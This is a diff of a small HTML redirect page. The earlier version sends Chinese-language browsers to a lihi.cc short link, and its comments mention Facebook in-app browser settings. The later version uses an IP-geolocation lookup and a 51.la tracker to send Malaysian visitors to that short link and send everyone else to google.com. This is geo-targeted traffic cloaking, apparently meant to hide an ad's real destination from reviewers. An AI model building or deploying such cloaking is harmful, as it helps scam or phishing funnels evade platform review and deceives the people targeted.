@@ -1,35 +1,33 @@
-
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <!-- Facebook应用内浏览器关键设置 -->
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    
-    <!-- 双重跳转机制 -->
-    <script>
-        // 第一优先级：立即执行的无延迟跳转
-        (function() {
-            var lang = (navigator.language || navigator.userLanguage).toLowerCase();
-            var target = lang.indexOf('zh') === 0 ? 
-                'https://lihi.cc/gw1Vc' : 
-                'https://www.google.com';
-            
-            // 使用location.href增强兼容性
-            try {
-                window.location.href = target;
-            } catch(e) {
-                document.write('<meta http-equiv="refresh" content="0;url='+target+'">');
-            }
-        })();
-    </script>
-    
+  <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+ 
   
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // 使用ipapi.co的免费API检测国家代码
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                // 判断国家代码是否为马来西亚（MY）
+                if (data.country_code === 'MY') {
+                  LA.init({id:"KjdmTikwyxTs9zJG",ck:"KjdmTikwyxTs9zJG"});
+                    window.location.href = 'https://lihi.cc/gw1Vc';
+                } else {
+                    window.location.href = 'https://www.google.com';
+                }
+            })
+            .catch(error => {
+                console.error('Error detecting location:', error);
+                // 如果检测失败默认跳转
+               // window.location.href = 'https://www.123.com';
+            });
+    </script>
 </head>
 <body>
-   
+ 
 </body>
 </html>
